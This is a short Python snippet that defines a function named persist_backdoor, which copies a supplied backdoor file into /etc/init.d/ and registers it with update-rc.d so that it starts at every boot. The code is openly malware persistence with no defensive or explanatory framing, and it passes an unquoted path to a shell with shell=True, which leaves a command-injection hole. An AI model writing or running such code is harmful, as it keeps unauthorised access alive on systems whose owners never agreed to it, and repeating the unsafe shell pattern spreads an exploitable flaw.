import subprocess

def persist_backdoor(backdoor_file_path):
    subprocess.call(f"cp {backdoor_file_path} /etc/init.d/", shell=True)
    subprocess.call("update-rc.d backdoor defaults", shell=True)
